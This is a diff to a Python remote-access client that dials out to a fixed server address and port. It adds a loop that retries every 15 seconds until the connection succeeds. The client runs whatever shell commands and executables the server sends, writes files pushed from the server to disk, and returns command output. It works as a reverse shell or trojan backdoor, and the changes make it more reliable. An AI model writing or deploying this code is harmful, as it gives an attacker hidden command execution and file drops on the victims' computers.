@@ -9,7 +9,15 @@ SERVER_PORT = 21420
 
 # Connect to server with given IP and PORT
 client = socket.socket()
-client.connect((SERVER_HOST, SERVER_PORT))
+while True:
+    try:
+        client.connect((SERVER_HOST, SERVER_PORT))
+        break
+    except Exception as err:
+        print(err)
+        time.sleep(15)
+        pass
+print("Connection has been established!")
 
 # When connection is established
 while True:
@@ -39,7 +47,6 @@ while True:
                 f.write(data)
             client.send("Download complete.".encode())
             f.close()
-        # Run exe / bat files
         elif serverCommand == "exe_True":
             exeCommand = client.recv(1024).decode()
             subprocess.Popen(exeCommand, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
@@ -49,10 +56,10 @@ while True:
             cmdPrompt = subprocess.Popen(serverCommand, shell=True, stdout=subprocess.PIPE,
                                          stderr=subprocess.STDOUT, text=True)
             getOutput = cmdPrompt.stdout.read().encode()
-
+            sendsize = sys.getsizeof(getOutput)
             # Send back the output
-            client.send(str(sys.getsizeof(getOutput)).encode())
-            time.sleep(0.5)
+            client.send(str(sendsize).encode())
+            time.sleep(2)
             client.send(getOutput)
 
 # client.close()
